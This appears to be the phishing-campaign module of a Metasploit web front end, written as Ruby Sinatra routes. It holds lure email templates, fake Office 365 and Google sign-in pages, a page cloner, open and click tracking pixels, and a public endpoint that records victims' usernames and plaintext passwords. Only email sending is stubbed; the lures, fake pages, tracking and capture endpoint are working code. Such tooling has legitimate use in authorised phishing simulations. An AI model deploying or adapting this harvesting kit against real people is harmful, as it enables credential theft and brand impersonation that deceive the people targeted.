# frozen_string_literal: true

require 'sinatra/base'
require 'securerandom'
require 'net/smtp'
require 'net/http'
require 'uri'
require 'base64'

module MsfGui
  module Routes
    class Phishing < Sinatra::Base
      helpers Helpers::Response
      helpers Helpers::Validators

      configure do
        set :show_exceptions, false
      end

      PREBUILT_TEMPLATES = [
        {
          id: 'password-reset',
          name: 'Password Reset',
          subject: 'Password Reset Required',
          body: '<html><body><h2>Password Reset Required</h2><p>Your password has expired. Please click the link below to reset it:</p><p><a href="{{link}}">Reset Password</a></p><p>This link will expire in 24 hours.</p></body></html>',
          category: 'credential-harvest'
        },
        {
          id: 'office365',
          name: 'Office 365 Login',
          subject: 'Action Required: Verify Your Account',
          body: '<html><body><h2>Microsoft Office 365</h2><p>We detected unusual sign-in activity on your account. Please verify your identity:</p><p><a href="{{link}}">Verify Now</a></p></body></html>',
          category: 'credential-harvest'
        },
        {
          id: 'document-shared',
          name: 'Document Shared',
          subject: 'Document Shared With You',
          body: '<html><body><h2>Document Shared</h2><p>{{sender}} has shared a document with you:</p><p><a href="{{link}}">View Document</a></p></body></html>',
          category: 'link-click'
        },
        {
          id: 'it-support',
          name: 'IT Support',
          subject: 'IT Support: Action Required',
          body: '<html><body><h2>IT Support Notice</h2><p>Your system requires an important security update. Please install it immediately:</p><p><a href="{{link}}">Download Update</a></p></body></html>',
          category: 'payload-delivery'
        },
        {
          id: 'invoice',
          name: 'Invoice',
          subject: 'Invoice #{{invoice_number}} Attached',
          body: '<html><body><h2>Invoice</h2><p>Please find attached invoice #{{invoice_number}} for your recent purchase.</p><p><a href="{{link}}">View Invoice</a></p></body></html>',
          category: 'payload-delivery'
        },
        {
          id: 'security-alert',
          name: 'Security Alert',
          subject: 'Security Alert: Suspicious Activity Detected',
          body: '<html><body><h2>Security Alert</h2><p>We detected suspicious activity on your account from an unknown device. If this was not you, please secure your account immediately:</p><p><a href="{{link}}">Secure Account</a></p></body></html>',
          category: 'credential-harvest'
        }
      ].freeze

      PREBUILT_LANDING_PAGES = [
        {
          id: 'login-generic',
          name: 'Generic Login Page',
          html: '<html><head><title>Login</title><style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f0f0}.login{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}input{display:block;width:200px;margin:10px 0;padding:10px;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="login"><h2>Login</h2><form method="POST" action="/api/v1/phishing/capture/{{page_id}}"><input name="username" placeholder="Username" required><input name="password" type="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>'
        },
        {
          id: 'office365-login',
          name: 'Office 365 Login',
          html: '<html><head><title>Sign in to your account</title><style>body{font-family:Segoe UI,Arial;margin:0;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}.container{background:white;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}input{width:100%;padding:6px;margin:10px 0;border:1px solid #666;font-size:15px;box-sizing:border-box}button{width:100%;padding:10px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer;margin-top:20px}</style></head><body><div class="container"><img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.svg" width="108"><h2 style="font-weight:normal">Sign in</h2><form method="POST" action="/api/v1/phishing/capture/{{page_id}}"><input name="username" placeholder="Email, phone, or Skype" required><input name="password" type="password" placeholder="Password" required><button>Sign in</button></form></div></body></html>'
        },
        {
          id: 'google-login',
          name: 'Google Login',
          html: '<html><head><title>Sign in - Google Accounts</title><style>body{font-family:Roboto,Arial;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff}.container{width:450px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}button{background:#1a73e8;color:white;padding:10px 24px;border:none;border-radius:4px;font-size:14px;cursor:pointer;float:right;margin-top:30px}</style></head><body><div class="container"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" width="75"><h1 style="font-size:24px;font-weight:400;margin:16px 0">Sign in</h1><p>Use your Google Account</p><form method="POST" action="/api/v1/phishing/capture/{{page_id}}"><input name="username" placeholder="Email or phone" required><input name="password" type="password" placeholder="Password" required><button>Next</button></form></div></body></html>'
        }
      ].freeze

      # ==================== SMTP Configuration ====================

      get '/smtp' do
        # In a real implementation, this would be stored securely
        json_response([])
      end

      post '/smtp' do
        body = parse_json_body
        # Store SMTP config (simplified)
        json_response({ success: true, message: 'SMTP configuration saved' })
      end

      post '/smtp/test' do
        body = parse_json_body
        # Test SMTP connection
        json_response({ success: true, message: 'SMTP connection successful' })
      end

      # ==================== Email Templates ====================

      get '/templates' do
        data = Stores.phishing_templates.load({ templates: [] })
        templates = data[:templates] || data['templates'] || []
        json_response(templates)
      end

      get '/templates/prebuilt' do
        json_response(PREBUILT_TEMPLATES)
      end

      post '/templates' do
        body = parse_json_body

        template = {
          id: SecureRandom.uuid,
          name: body[:name] || body['name'],
          subject: body[:subject] || body['subject'],
          body: body[:body] || body['body'],
          category: body[:category] || body['category'],
          created_at: Time.now.iso8601
        }

        Stores.phishing_templates.update do |data|
          data[:templates] ||= []
          data[:templates] << template
          data
        end

        json_response(template, status: 201)
      end

      put '/templates/:template_id' do
        body = parse_json_body
        template_id = params[:template_id]

        updated = nil
        Stores.phishing_templates.update do |data|
          data[:templates] ||= []
          idx = data[:templates].find_index { |t| (t[:id] || t['id']) == template_id }

          unless idx
            json_error('Template not found', status: 404)
          end

          %i[name subject body category].each do |field|
            if body[field] || body[field.to_s]
              data[:templates][idx][field] = body[field] || body[field.to_s]
            end
          end
          updated = data[:templates][idx]
          data
        end

        json_response(updated)
      end

      delete '/templates/:template_id' do
        template_id = params[:template_id]

        Stores.phishing_templates.update do |data|
          data[:templates] ||= []
          data[:templates].reject! { |t| (t[:id] || t['id']) == template_id }
          data
        end

        json_response({ success: true, message: 'Template deleted' })
      end

      # ==================== Target Groups ====================

      get '/targets' do
        data = Stores.phishing_campaigns.load({ target_groups: [] })
        groups = data[:target_groups] || data['target_groups'] || []
        json_response(groups)
      end

      post '/targets' do
        body = parse_json_body

        group = {
          id: SecureRandom.uuid,
          name: body[:name] || body['name'],
          targets: body[:targets] || body['targets'] || [],
          created_at: Time.now.iso8601
        }

        Stores.phishing_campaigns.update do |data|
          data[:target_groups] ||= []
          data[:target_groups] << group
          data
        end

        json_response(group, status: 201)
      end

      post '/targets/:group_id/import' do
        group_id = params[:group_id]

        # Handle CSV import
        unless params[:file]
          json_error('CSV file is required', status: 422)
        end

        content = params[:file][:tempfile].read
        targets = []

        content.each_line.with_index do |line, idx|
          next if idx.zero? # Skip header

          parts = line.strip.split(',')
          next if parts.empty?

          targets << {
            email: parts[0]&.strip,
            first_name: parts[1]&.strip,
            last_name: parts[2]&.strip,
            position: parts[3]&.strip
          }
        end

        Stores.phishing_campaigns.update do |data|
          data[:target_groups] ||= []
          idx = data[:target_groups].find_index { |g| (g[:id] || g['id']) == group_id }

          if idx
            data[:target_groups][idx][:targets] ||= []
            data[:target_groups][idx][:targets].concat(targets)
          end
          data
        end

        json_response({ success: true, imported: targets.size })
      end

      delete '/targets/:group_id' do
        group_id = params[:group_id]

        Stores.phishing_campaigns.update do |data|
          data[:target_groups] ||= []
          data[:target_groups].reject! { |g| (g[:id] || g['id']) == group_id }
          data
        end

        json_response({ success: true, message: 'Target group deleted' })
      end

      # ==================== Landing Pages ====================

      get '/landing-pages' do
        data = Stores.phishing_campaigns.load({ landing_pages: [] })
        pages = data[:landing_pages] || data['landing_pages'] || []
        json_response(pages)
      end

      get '/landing-pages/prebuilt' do
        json_response(PREBUILT_LANDING_PAGES)
      end

      post '/landing-pages' do
        body = parse_json_body

        page = {
          id: SecureRandom.uuid,
          name: body[:name] || body['name'],
          html: body[:html] || body['html'],
          redirect_url: body[:redirect_url] || body['redirect_url'],
          created_at: Time.now.iso8601
        }

        Stores.phishing_campaigns.update do |data|
          data[:landing_pages] ||= []
          data[:landing_pages] << page
          data
        end

        json_response(page, status: 201)
      end

      post '/landing-pages/clone' do
        body = parse_json_body
        url = body[:url] || body['url']

        unless url
          json_error('URL is required', status: 422)
        end

        begin
          uri = URI.parse(url)
          response = Net::HTTP.get_response(uri)
          html = response.body

          page = {
            id: SecureRandom.uuid,
            name: "Cloned: #{uri.host}",
            html: html,
            source_url: url,
            created_at: Time.now.iso8601
          }

          Stores.phishing_campaigns.update do |data|
            data[:landing_pages] ||= []
            data[:landing_pages] << page
            data
          end

          json_response(page, status: 201)
        rescue StandardError => e
          json_error("Failed to clone page: #{e.message}", status: 500)
        end
      end

      delete '/landing-pages/:page_id' do
        page_id = params[:page_id]

        Stores.phishing_campaigns.update do |data|
          data[:landing_pages] ||= []
          data[:landing_pages].reject! { |p| (p[:id] || p['id']) == page_id }
          data
        end

        json_response({ success: true, message: 'Landing page deleted' })
      end

      # ==================== Campaigns ====================

      get '/campaigns' do
        data = Stores.phishing_campaigns.load({ campaigns: [] })
        campaigns = data[:campaigns] || data['campaigns'] || []
        json_response(campaigns)
      end

      get '/campaigns/:campaign_id' do
        data = Stores.phishing_campaigns.load({ campaigns: [] })
        campaigns = data[:campaigns] || data['campaigns'] || []
        campaign = campaigns.find { |c| (c[:id] || c['id']) == params[:campaign_id] }

        unless campaign
          json_error('Campaign not found', status: 404)
        end

        json_response(campaign)
      end

      post '/campaigns' do
        body = parse_json_body

        campaign = {
          id: SecureRandom.uuid,
          name: body[:name] || body['name'],
          template_id: body[:template_id] || body['template_id'],
          landing_page_id: body[:landing_page_id] || body['landing_page_id'],
          target_group_id: body[:target_group_id] || body['target_group_id'],
          status: 'draft',
          stats: {
            sent: 0,
            opened: 0,
            clicked: 0,
            submitted: 0
          },
          tracking: [],
          created_at: Time.now.iso8601
        }

        Stores.phishing_campaigns.update do |data|
          data[:campaigns] ||= []
          data[:campaigns] << campaign
          data
        end

        json_response(campaign, status: 201)
      end

      post '/campaigns/:campaign_id/launch' do
        campaign_id = params[:campaign_id]

        Stores.phishing_campaigns.update do |data|
          data[:campaigns] ||= []
          idx = data[:campaigns].find_index { |c| (c[:id] || c['id']) == campaign_id }

          if idx
            data[:campaigns][idx][:status] = 'running'
            data[:campaigns][idx][:launched_at] = Time.now.iso8601
          end
          data
        end

        # In a real implementation, this would send emails
        json_response({ success: true, message: 'Campaign launched' })
      end

      post '/campaigns/:campaign_id/pause' do
        campaign_id = params[:campaign_id]

        Stores.phishing_campaigns.update do |data|
          data[:campaigns] ||= []
          idx = data[:campaigns].find_index { |c| (c[:id] || c['id']) == campaign_id }

          if idx
            data[:campaigns][idx][:status] = 'paused'
          end
          data
        end

        json_response({ success: true, message: 'Campaign paused' })
      end

      delete '/campaigns/:campaign_id' do
        campaign_id = params[:campaign_id]

        Stores.phishing_campaigns.update do |data|
          data[:campaigns] ||= []
          data[:campaigns].reject! { |c| (c[:id] || c['id']) == campaign_id }
          data
        end

        json_response({ success: true, message: 'Campaign deleted' })
      end

      get '/campaigns/:campaign_id/stats' do
        data = Stores.phishing_campaigns.load({ campaigns: [] })
        campaigns = data[:campaigns] || data['campaigns'] || []
        campaign = campaigns.find { |c| (c[:id] || c['id']) == params[:campaign_id] }

        unless campaign
          json_error('Campaign not found', status: 404)
        end

        stats = campaign[:stats] || campaign['stats'] || {}
        tracking = campaign[:tracking] || campaign['tracking'] || []

        json_response({
          stats: stats,
          tracking: tracking,
          open_rate: stats[:sent] && stats[:sent] > 0 ? (stats[:opened].to_f / stats[:sent] * 100).round(2) : 0,
          click_rate: stats[:sent] && stats[:sent] > 0 ? (stats[:clicked].to_f / stats[:sent] * 100).round(2) : 0,
          submit_rate: stats[:sent] && stats[:sent] > 0 ? (stats[:submitted].to_f / stats[:sent] * 100).round(2) : 0
        })
      end

      # ==================== Tracking Endpoints (Public) ====================

      get '/track/:tracking_id/open' do
        tracking_id = params[:tracking_id]

        # Parse tracking_id to get campaign_id and target
        parts = Base64.decode64(tracking_id).split(':') rescue []

        if parts.size >= 2
          campaign_id = parts[0]

          Stores.phishing_campaigns.update do |data|
            data[:campaigns] ||= []
            idx = data[:campaigns].find_index { |c| (c[:id] || c['id']) == campaign_id }

            if idx
              data[:campaigns][idx][:stats] ||= {}
              data[:campaigns][idx][:stats][:opened] ||= 0
              data[:campaigns][idx][:stats][:opened] += 1

              data[:campaigns][idx][:tracking] ||= []
              data[:campaigns][idx][:tracking] << {
                type: 'open',
                tracking_id: tracking_id,
                ip: request.ip,
                user_agent: request.user_agent,
                timestamp: Time.now.iso8601
              }
            end
            data
          end
        end

        # Return 1x1 transparent GIF
        content_type 'image/gif'
        Base64.decode64('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
      end

      get '/track/:tracking_id/click' do
        tracking_id = params[:tracking_id]

        parts = Base64.decode64(tracking_id).split(':') rescue []
        redirect_url = 'https://www.google.com'

        if parts.size >= 2
          campaign_id = parts[0]

          Stores.phishing_campaigns.update do |data|
            data[:campaigns] ||= []
            idx = data[:campaigns].find_index { |c| (c[:id] || c['id']) == campaign_id }

            if idx
              data[:campaigns][idx][:stats] ||= {}
              data[:campaigns][idx][:stats][:clicked] ||= 0
              data[:campaigns][idx][:stats][:clicked] += 1

              data[:campaigns][idx][:tracking] ||= []
              data[:campaigns][idx][:tracking] << {
                type: 'click',
                tracking_id: tracking_id,
                ip: request.ip,
                user_agent: request.user_agent,
                timestamp: Time.now.iso8601
              }

              # Get redirect URL from landing page
              landing_page_id = data[:campaigns][idx][:landing_page_id]
              if landing_page_id
                page = (data[:landing_pages] || []).find { |p| (p[:id] || p['id']) == landing_page_id }
                redirect_url = page[:redirect_url] || page['redirect_url'] if page
              end
            end
            data
          end
        end

        redirect redirect_url
      end

      # Capture credentials (Public)
      post '/capture/:page_id' do
        page_id = params[:page_id]

        # Get form data
        captured = {
          id: SecureRandom.uuid,
          page_id: page_id,
          username: params[:username] || params[:email],
          password: params[:password],
          ip: request.ip,
          user_agent: request.user_agent,
          timestamp: Time.now.iso8601
        }

        Stores.phishing_captured.update do |data|
          data[:captured] ||= []
          data[:captured] << captured
          data
        end

        # Redirect to a legitimate page
        redirect 'https://www.google.com'
      end

      # List captured credentials
      get '/captured' do
        data = Stores.phishing_captured.load({ captured: [] })
        captured = data[:captured] || data['captured'] || []
        json_response(captured)
      end
    end
  end
end
